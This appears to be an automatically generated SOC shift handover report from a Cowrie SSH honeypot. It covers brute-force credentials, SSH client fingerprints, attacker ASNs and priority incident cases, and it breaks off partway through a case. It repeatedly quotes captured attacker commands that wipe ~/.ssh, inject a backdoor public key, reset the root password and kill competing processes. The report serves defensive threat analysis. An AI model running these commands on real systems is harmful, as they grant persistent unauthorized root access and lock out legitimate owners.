# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-29 |
| **Generated At** | 2026-05-29T23:17:37Z |
| **Shift Time** | 23:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **235** |
| Confirmed Threats | **179** |
| False Positives Filtered | **56** (23.8%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **13** |
| High Severity Cases | **37** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **198** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **22** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 37 |
| `345gs5662d34` | 16 |
| `ubuntu` | 1 |
| `user1` | 1 |
| `zjw` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 18 |
| `345gs5662d34` | 16 |
| `1q2w3e4r$R#E@W!Q` | 3 |
| `root` | 2 |
| `!QAZ2wsx3edc` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 18 |
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `1q2w3e4r$R#E@W!Q` | 3 |
| `ubuntu` | `!QAZ2wsx3edc` | 1 |
| `user1` | `Welcome@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `aa123123` | `120.138.6.3` | 2026-05-29T20:57:00 |
| `root` | `3245gs5662d34` | `120.138.6.3` | 2026-05-29T20:57:01 |
| `root` | `AAaa123456` | `120.138.6.3` | 2026-05-29T20:58:43 |
| `root` | `nodejs` | `120.138.6.3` | 2026-05-29T21:00:28 |
| `root` | `yuanyuan` | `120.138.6.3` | 2026-05-29T21:02:06 |
| `root` | `Aa159753` | `120.138.6.3` | 2026-05-29T21:03:46 |
| `root` | `Admin123@@` | `118.39.234.65` | 2026-05-29T21:05:09 |
| `root` | `3245gs5662d34` | `118.39.234.65` | 2026-05-29T21:05:13 |
| `root` | `Aa654321` | `81.192.46.36` | 2026-05-29T21:05:28 |
| `root` | `3245gs5662d34` | `81.192.46.36` | 2026-05-29T21:05:32 |
| `root` | `digitalocean` | `118.39.234.65` | 2026-05-29T21:11:45 |
| `root` | `qw1234` | `120.138.6.3` | 2026-05-29T21:11:51 |
| `root` | `Zh123456` | `120.138.6.3` | 2026-05-29T21:13:31 |
| `root` | `P@ssw0rd123!` | `118.39.234.65` | 2026-05-29T21:15:08 |
| `root` | `Pi@12345678` | `120.138.6.3` | 2026-05-29T21:16:50 |
| `root` | `Li147258` | `118.39.234.65` | 2026-05-29T21:16:51 |
| `root` | `Passwd123` | `118.39.234.65` | 2026-05-29T21:18:33 |
| `root` | `1020304050` | `87.76.176.37` | 2026-05-29T23:06:44 |
| `root` | `3245gs5662d34` | `87.76.176.37` | 2026-05-29T23:06:47 |
| `root` | `1q2w3e4r$R#E@W!Q` | `180.184.38.93` | 2026-05-29T23:06:59 |
| `root` | `1q2w3e4r$R#E@W!Q` | `41.33.90.68` | 2026-05-29T23:07:05 |
| `root` | `3245gs5662d34` | `180.184.38.93` | 2026-05-29T23:07:16 |
| `root` | `12345671` | `168.167.228.123` | 2026-05-29T23:10:00 |
| `root` | `3245gs5662d34` | `168.167.228.123` | 2026-05-29T23:10:07 |
| `root` | `1q2w3e4r$R#E@W!Q` | `101.126.155.86` | 2026-05-29T23:11:04 |
| `root` | `3245gs5662d34` | `101.126.155.86` | 2026-05-29T23:11:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **235** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 79 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 71 | 8 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 71 | 8 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WgnbIV4txW67"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `41.33.90.68`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.138.6.3`, `118.39.234.65`, `180.184.38.93`, `87.76.176.37`, `81.192.46.36`, `101.126.155.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **18** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS27747` | Telecentro S.A. | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS400506` | Black Apple | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (37)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ed9cdcadab01

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 20:57 |
| **Last Seen** | 2026-05-29 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 20:57:00` | `cowrie.session.connect` |
| `2026-05-29 20:57:00` | `cowrie.client.version` |
| `2026-05-29 20:57:00` | `cowrie.client.kex` |
| `2026-05-29 20:57:00` | `cowrie.login.success` |
| `2026-05-29 20:57:00` | `cowrie.session.params` |
| `2026-05-29 20:57:00` | `cowrie.command.input` |
| `2026-05-29 20:57:00` | `cowrie.command.failed` |
| `2026-05-29 20:57:00` | `cowrie.log.closed` |
| `2026-05-29 20:57:00` | `cowrie.session.params` |
| `2026-05-29 20:57:00` | `cowrie.command.input` |
| `2026-05-29 20:57:00` | `cowrie.session.file_download` |
| `2026-05-29 20:57:00` | `cowrie.log.closed` |
| `2026-05-29 20:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41db94d733a7

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 20:57 |
| **Last Seen** | 2026-05-29 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 20:57:01` | `cowrie.session.connect` |
| `2026-05-29 20:57:01` | `cowrie.client.version` |
| `2026-05-29 20:57:01` | `cowrie.client.kex` |
| `2026-05-29 20:57:01` | `cowrie.login.success` |
| `2026-05-29 20:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdda54f46dcc

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 20:58 |
| **Last Seen** | 2026-05-29 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 20:58:43` | `cowrie.session.connect` |
| `2026-05-29 20:58:43` | `cowrie.client.version` |
| `2026-05-29 20:58:43` | `cowrie.client.kex` |
| `2026-05-29 20:58:43` | `cowrie.login.success` |
| `2026-05-29 20:58:43` | `cowrie.session.params` |
| `2026-05-29 20:58:43` | `cowrie.command.input` |
| `2026-05-29 20:58:43` | `cowrie.command.failed` |
| `2026-05-29 20:58:43` | `cowrie.log.closed` |
| `2026-05-29 20:58:43` | `cowrie.session.params` |
| `2026-05-29 20:58:43` | `cowrie.command.input` |
| `2026-05-29 20:58:43` | `cowrie.session.file_download` |
| `2026-05-29 20:58:43` | `cowrie.log.closed` |
| `2026-05-29 20:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7e96dcaa80

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 20:58 |
| **Last Seen** | 2026-05-29 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 20:58:44` | `cowrie.session.connect` |
| `2026-05-29 20:58:44` | `cowrie.client.version` |
| `2026-05-29 20:58:44` | `cowrie.client.kex` |
| `2026-05-29 20:58:44` | `cowrie.login.success` |
| `2026-05-29 20:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2db76154db

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:00 |
| **Last Seen** | 2026-05-29 21:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:00:28` | `cowrie.session.connect` |
| `2026-05-29 21:00:28` | `cowrie.client.version` |
| `2026-05-29 21:00:28` | `cowrie.client.kex` |
| `2026-05-29 21:00:28` | `cowrie.login.success` |
| `2026-05-29 21:00:28` | `cowrie.session.params` |
| `2026-05-29 21:00:28` | `cowrie.command.input` |
| `2026-05-29 21:00:28` | `cowrie.command.failed` |
| `2026-05-29 21:00:28` | `cowrie.log.closed` |
| `2026-05-29 21:00:28` | `cowrie.session.params` |
| `2026-05-29 21:00:28` | `cowrie.command.input` |
| `2026-05-29 21:00:28` | `cowrie.session.file_download` |
| `2026-05-29 21:00:28` | `cowrie.log.closed` |
| `2026-05-29 21:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f332a3b23ce9

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:00 |
| **Last Seen** | 2026-05-29 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:00:29` | `cowrie.session.connect` |
| `2026-05-29 21:00:29` | `cowrie.client.version` |
| `2026-05-29 21:00:29` | `cowrie.client.kex` |
| `2026-05-29 21:00:29` | `cowrie.login.success` |
| `2026-05-29 21:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7add2358b7ea

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:02 |
| **Last Seen** | 2026-05-29 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:02:06` | `cowrie.session.connect` |
| `2026-05-29 21:02:06` | `cowrie.client.version` |
| `2026-05-29 21:02:06` | `cowrie.client.kex` |
| `2026-05-29 21:02:06` | `cowrie.login.success` |
| `2026-05-29 21:02:07` | `cowrie.session.params` |
| `2026-05-29 21:02:07` | `cowrie.command.input` |
| `2026-05-29 21:02:07` | `cowrie.command.failed` |
| `2026-05-29 21:02:07` | `cowrie.log.closed` |
| `2026-05-29 21:02:07` | `cowrie.session.params` |
| `2026-05-29 21:02:07` | `cowrie.command.input` |
| `2026-05-29 21:02:07` | `cowrie.session.file_download` |
| `2026-05-29 21:02:07` | `cowrie.log.closed` |
| `2026-05-29 21:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517f899a0724

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:02 |
| **Last Seen** | 2026-05-29 21:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:02:08` | `cowrie.session.connect` |
| `2026-05-29 21:02:08` | `cowrie.client.version` |
| `2026-05-29 21:02:08` | `cowrie.client.kex` |
| `2026-05-29 21:02:08` | `cowrie.login.success` |
| `2026-05-29 21:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58dc1abe66a2

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:03 |
| **Last Seen** | 2026-05-29 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:03:45` | `cowrie.session.connect` |
| `2026-05-29 21:03:45` | `cowrie.client.version` |
| `2026-05-29 21:03:45` | `cowrie.client.kex` |
| `2026-05-29 21:03:46` | `cowrie.login.success` |
| `2026-05-29 21:03:46` | `cowrie.session.params` |
| `2026-05-29 21:03:46` | `cowrie.command.input` |
| `2026-05-29 21:03:46` | `cowrie.command.failed` |
| `2026-05-29 21:03:46` | `cowrie.log.closed` |
| `2026-05-29 21:03:46` | `cowrie.session.params` |
| `2026-05-29 21:03:46` | `cowrie.command.input` |
| `2026-05-29 21:03:46` | `cowrie.session.file_download` |
| `2026-05-29 21:03:46` | `cowrie.log.closed` |
| `2026-05-29 21:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f1fb4eec41b

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:03 |
| **Last Seen** | 2026-05-29 21:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:03:47` | `cowrie.session.connect` |
| `2026-05-29 21:03:47` | `cowrie.client.version` |
| `2026-05-29 21:03:47` | `cowrie.client.kex` |
| `2026-05-29 21:03:47` | `cowrie.login.success` |
| `2026-05-29 21:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e07d048afc

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:05 |
| **Last Seen** | 2026-05-29 21:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:05:08` | `cowrie.session.connect` |
| `2026-05-29 21:05:08` | `cowrie.client.version` |
| `2026-05-29 21:05:09` | `cowrie.client.kex` |
| `2026-05-29 21:05:09` | `cowrie.login.success` |
| `2026-05-29 21:05:10` | `cowrie.session.params` |
| `2026-05-29 21:05:10` | `cowrie.command.input` |
| `2026-05-29 21:05:10` | `cowrie.command.failed` |
| `2026-05-29 21:05:10` | `cowrie.log.closed` |
| `2026-05-29 21:05:10` | `cowrie.session.params` |
| `2026-05-29 21:05:10` | `cowrie.command.input` |
| `2026-05-29 21:05:10` | `cowrie.session.file_download` |
| `2026-05-29 21:05:10` | `cowrie.log.closed` |
| `2026-05-29 21:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea2b416200d

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:05 |
| **Last Seen** | 2026-05-29 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:05:12` | `cowrie.session.connect` |
| `2026-05-29 21:05:12` | `cowrie.client.version` |
